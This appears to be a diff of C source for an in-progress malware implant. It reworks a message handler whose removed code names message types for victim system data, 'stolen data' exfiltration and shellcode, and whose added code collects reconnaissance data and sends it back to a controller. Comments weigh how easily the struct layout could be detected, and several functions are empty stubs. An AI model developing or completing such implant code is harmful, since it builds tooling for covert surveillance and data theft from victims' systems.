@@ -1,44 +1,30 @@
 
-// TODO: messagetype and their structs should be in their own file called MessageType/s.h?
-enum MessageType
+#include "MessageTypes.h"
+#include "MessagePublisher.h"
+#include "recon.h"
+
+
+// this function processes the header of the message
+// to determine how to interpet the contents/data of 
+// the message. 
+//int processMessage(BYTE* payload, MessageHeader* header)
+// int processIncomingMessage(InternalMessage* msg, Config* config)
+int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
 {
-	HANDSHAKE,          // Initial connection
-	HEARTBEAT,          // Regular check-in
-	SYSTEM_INFO,        // Victim system data
-	COMMAND_RESULT,     // Output from executed command
-	DATA_EXFIL,         // Stolen data
-	FILE_UPLOAD,        // File transfer
-	ERROR_REPORT        // Error information
-
-};
-
-
-struct MessageHeader
-{
-	MessageType messageType;
-	//ULONG messageId; ?
-	//ULONG payloadSize; // MessageDataSize
-	//ULONG checksum; ?
-
-};
-
-
-// NOTE: InternalMessage will have to serialize,encrypt,enocde,...etc both the header and payload separately? then combine them together into one array?
-// ex: serialize(InternalMessage) wont work, need to do serialize(InternalMessage.header) + serialize(InternalMessage.payload)
-// NOTE: this stuct will be easier to detect (struct containing structs), instead of just having the raw fields listed out
-struct InternalMessage 
-{
-	MessageHeader header; // the header... always use custom header? no need for tlv... MessageType enum should be defined in header
-	//MessageData payload; // the actual payload
-	BYTE payload[4096]; // TODO: shouldn't be fixed size?
-}; 
-
-
-int processMessage(BYTE* payload, MessageHeader* header)
-{
-	switch (header->message_type) {
+	switch (msg->header.messageType) {
 		case SYSTEM_INFO:
-			return SendSystemInfo(header->message_id);
+		{
+			ReconMessage reconMessage;
+			int status = generateReconMessage(&reconMessage);
+
+			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
+			InternalMessage* response = malloc(sizeof(InternalMessage));
+			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
+			response->header.payload_size = sizeof(ReconMessage);
+			//return send(msg->header.message_id);
+			status |= send(response, config);
+			return status;
+		}
 
 		/*
 		case MSG_TYPE_SHELLCODE:
@@ -53,10 +39,12 @@ int processMessage(BYTE* payload, MessageHeader* header)
 	return 0;
 }
 
-int serialize()
-{}
+int serialize(InternalMessage* msg, uint8_t* buf, SerializationType serializationType) 
+{
 
-size_t serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
+}
+
+int serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
 	BYTE* ptr = buffer; // uint8_t*
 
 	// Copy each field from msg struct to buffer
@@ -68,5 +56,11 @@ size_t serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
 	return ptr - buffer; // Returns total bytes copied
 }
 
-int deserialize()
-{}
+// int deserialize() {}
+
+
+
+int compressData(uint8_t* buf) 
+{
+
+}
